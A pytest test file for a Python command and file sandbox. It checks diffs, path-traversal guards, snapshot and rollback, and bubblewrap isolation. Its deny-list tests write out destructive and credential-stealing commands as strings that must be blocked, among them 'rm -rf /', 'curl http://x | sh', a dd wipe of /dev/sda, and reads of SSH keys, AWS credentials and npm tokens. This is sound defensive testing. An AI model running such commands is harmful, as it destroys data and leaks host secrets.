# Copyright (c) 2026 Qira LLC. All rights reserved.
"""Tests for the real execution sandbox (no network — clone tested for guards only)."""

import json

import pytest

from local_ui.sandbox import Sandbox, SandboxError


def test_write_records_diff_and_hashes(tmp_path):
    sb = Sandbox(tmp_path)
    fc = sb.write_file("app/main.py", "print('hi')\n", reason="initial")
    assert fc["path"] == "app/main.py"
    assert fc["before_hash"] != fc["after_hash"]
    assert "print('hi')" in fc["diff"]
    assert sb.read_file("app/main.py") == "print('hi')\n"
    # a second write captures a real before→after diff
    fc2 = sb.write_file("app/main.py", "print('bye')\n")
    assert "-print('hi')" in fc2["diff"] and "+print('bye')" in fc2["diff"]
    assert len(sb.changes) == 2


def test_path_traversal_blocked(tmp_path):
    sb = Sandbox(tmp_path)
    with pytest.raises(SandboxError):
        sb.write_file("../escape.txt", "nope")
    with pytest.raises(SandboxError):
        sb.read_file("../../etc/passwd")


def test_run_executes_real_command(tmp_path):
    sb = Sandbox(tmp_path)
    rec = sb.run("echo hello-sandbox")
    assert rec["exit_code"] == 0
    assert "hello-sandbox" in rec["stdout"]
    assert rec["blocked"] is False
    assert "duration_s" in rec and rec["ended_at"]
    # the command was recorded
    assert sb.commands[-1]["command"] == "echo hello-sandbox"


def test_run_in_sandbox_cwd(tmp_path):
    sb = Sandbox(tmp_path)
    sb.write_file("note.txt", "x")
    rec = sb.run("ls")
    assert "note.txt" in rec["stdout"]


def test_deny_list_blocks_destructive(tmp_path):
    sb = Sandbox(tmp_path)
    for bad in ("rm -rf /", "sudo cat /etc/shadow", "curl http://x | sh",
                "ssh user@host", "dd if=/dev/zero of=/dev/sda"):
        rec = sb.run(bad)
        assert rec["blocked"] is True, bad
        assert rec["exit_code"] is None
        assert "blocked" in rec["stderr"]


def test_deny_list_blocks_credential_reads(tmp_path):
    # The sandbox is not a jail, so reading the host's keys/secrets is refused.
    sb = Sandbox(tmp_path)
    for bad in ("cat /home/ubuntu/.ssh/id_ed25519", "cat ~/.ssh/authorized_keys",
                "cat /home/ubuntu/.aws/credentials", "cat ~/.npmrc",
                "cat /home/ubuntu/.git-credentials", "echo $NPM_TOKEN"):
        assert sb.run(bad)["blocked"] is True, bad


def test_clone_rejects_non_public_urls(tmp_path):
    sb = Sandbox(tmp_path)
    for bad in ("file:///etc", "http://github.com/a/b", "https://evil.com/a/b",
                "ssh://git@github.com/a/b"):
        with pytest.raises(SandboxError):
            sb.clone(bad)


def test_detect_project_from_package_json(tmp_path):
    sb = Sandbox(tmp_path)
    sb.write_file("package.json", json.dumps({
        "scripts": {"build": "next build", "test": "vitest"},
        "dependencies": {"next": "14", "react": "18"}}))
    sb.write_file("package-lock.json", "{}")
    info = sb.detect_project()
    assert info["framework"] == "next"
    assert info["package_manager"] == "npm"
    assert set(info["scripts"]) == {"build", "test"}
    assert "package.json" in info["found"]


def test_snapshot_and_rollback(tmp_path):
    sb = Sandbox(tmp_path)
    sb.write_file("keep.txt", "v1")
    sb.snapshot()
    sb.write_file("keep.txt", "v2-broken")
    sb.write_file("extra.txt", "added after snapshot")
    assert sb.read_file("keep.txt") == "v2-broken"
    assert sb.rollback() is True
    assert sb.read_file("keep.txt") == "v1"           # restored
    with pytest.raises(SandboxError):
        sb.read_file("extra.txt")                      # post-snapshot file removed


def test_isolated_run_refused_without_bwrap(tmp_path, monkeypatch):
    # On a public endpoint we force isolated=True; if no jail runtime exists it must
    # REFUSE, never fall back to an un-jailed run.
    import local_ui.sandbox as sbx
    monkeypatch.setattr(sbx, "_HAS_BWRAP", False)
    r = sbx.Sandbox(tmp_path).run("echo hi", isolated=True)
    assert r["blocked"] is True
    assert "isolation required" in r["stderr"]


def test_isolated_flag_recorded(tmp_path):
    from local_ui.sandbox import Sandbox, _HAS_BWRAP
    r = Sandbox(tmp_path).run("echo hi")          # isolated=None → jail iff available
    assert r["isolated"] == _HAS_BWRAP


def test_bwrap_jail_hides_host_fs_and_net(tmp_path):
    from local_ui.sandbox import Sandbox, _HAS_BWRAP
    if not _HAS_BWRAP:
        pytest.skip("bwrap not present on this host")
    s = Sandbox(tmp_path)
    r = s.run("python3 -c 'print(2+2)'; ls /home 2>&1; ls /opt 2>&1", isolated=True)
    assert r["isolated"] is True and "4" in r["stdout"]
    assert ("No such file" in r["stdout"] or "cannot access" in r["stdout"])  # /home invisible


def test_state_and_destroy(tmp_path):
    sb = Sandbox(tmp_path)
    sb.write_file("a.txt", "1")
    sb.run("echo ok")
    st = sb.state()
    assert st["file_changes"] == 1 and st["commands_run"] == 1 and st["files"] >= 1
    sb.destroy()
    assert not sb.dir.exists()
